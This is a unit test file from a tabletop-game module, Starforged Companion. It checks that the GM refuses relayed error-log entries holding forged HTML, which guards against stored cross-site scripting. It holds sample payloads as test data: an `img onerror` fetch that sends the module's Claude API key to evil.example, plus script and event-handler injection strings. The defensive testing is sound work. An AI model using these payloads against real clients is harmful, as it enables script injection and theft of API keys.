// STARFORGED COMPANION
// tests/unit/errorLogRelayBounded.test.js
//
// The GM files a relayed error-log entry only as the UI writes one
// (issue #331 X53).
//
// A player's client relays its module warnings to the canonical GM as
// `errorLog.append { user, html }`, and the GM appended `html` verbatim to the
// shared "Starforged Companion — Error Log" journal page. Only the user name
// was stripped of markup, so a forged payload (a console, a macro) persisted
// live HTML — an `<img onerror>`, a `<script>` — in a GM-owned document every
// GM opens. A relayed value is client-asserted (rules/reachability.md §8): the
// GM now files only one entry as formatEntry writes it — escaped text, its
// one tag the `<br>` a newline became — and refuses anything else.

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";

vi.mock("../../src/multiplayer/gmGate.js", () => ({ isCanonicalGM: vi.fn(() => true) }));

import { registerErrorLogSocket, formatEntry, _reset } from "../../src/logging/errorLog.js";

let origWarn, origError, handler, mockUpdate;

beforeEach(() => {
  origWarn = console.warn; origError = console.error;
  _reset(origWarn, origError);
  mockUpdate = vi.fn().mockResolvedValue({});
  const mockPage = { id: "p1", text: { content: "" }, update: mockUpdate };
  const mockJournal = { id: "j1", pages: { get: () => mockPage, contents: [mockPage] }, getName: () => null };
  vi.stubGlobal("game", {
    ready: true,
    user: { isGM: true },
    journal: { get: () => null, getName: () => mockJournal },
    socket: { on: (_evt, fn) => { handler = fn; } },
  });
  vi.stubGlobal("JournalEntry", { create: vi.fn().mockResolvedValue(mockJournal) });
  registerErrorLogSocket();
});
afterEach(() => { _reset(origWarn, origError); vi.unstubAllGlobals(); });

const written = () => mockUpdate.mock.calls.at(-1)?.[0]?.["text.content"] ?? "";
async function relay(html, user = "Pat") {
  await handler({ kind: "errorLog.append", user, html });
  await new Promise(r => setTimeout(r, 0));
}

describe("the GM bounds a relayed error-log entry to what the UI could send (issue #331 X53)", () => {
  it("control: an honest relayed entry is written, attributed to the player", async () => {
    await relay("<p>[t] WARN: starforged-companion | audio: no key</p>\n");
    expect(written()).toContain("[t] (Pat) WARN: starforged-companion | audio: no key");
  });

  it("control: a forged user name is stripped of markup", async () => {
    await relay("<p>[t] WARN: x</p>\n", "<b>Pat</b>");
    expect(written()).not.toMatch(/<b>/);
  });

  it("every entry formatEntry writes is filed — an Error's stack, markup in the text, a newline", async () => {
    const err = new Error("audio <synth> failed & retried");
    err.stack = "Error: audio <synth> failed\n    at play (<anonymous>:1:2)";
    for (const [level, args] of [
      ["WARN",  ["starforged-companion | audio cache relay refused:", err]],
      ["ERROR", ["starforged-companion | parse failed", { raw: "<npc>Hold</npc>" }]],
      ["WARN",  ["starforged-companion | two\nlines"]],
    ]) {
      mockUpdate.mockClear();
      const html = formatEntry(level, args);
      await relay(html);
      expect(mockUpdate).toHaveBeenCalledTimes(1);
      expect(written()).toContain(`${level}: starforged-companion |`);
    }
  });

  it("a relayed entry carrying markup is not persisted as live HTML in the GM's journal", async () => {
    const forged = '<p>[t] WARN: looks fine</p>\n<img src=x onerror="fetch(\'https://evil.example/?k=\'+game.settings.get(\'starforged-companion\',\'claudeApiKey\'))">';
    await relay(forged);
    expect(written()).not.toMatch(/<img\b/i);
    expect(written()).not.toMatch(/onerror=/i);
    expect(mockUpdate).not.toHaveBeenCalled();
  });

  it("an entry of the right shape with a tag in its text is refused", async () => {
    await relay('<p>[t] ERROR: <script>alert(1)</script></p>\n');
    await relay('<p>[t] WARN: <b onmouseover="x()">hover</b></p>\n');
    await relay('<p>[t] NOTICE: not a level the log writes</p>\n');
    expect(mockUpdate).not.toHaveBeenCalled();
  });
});
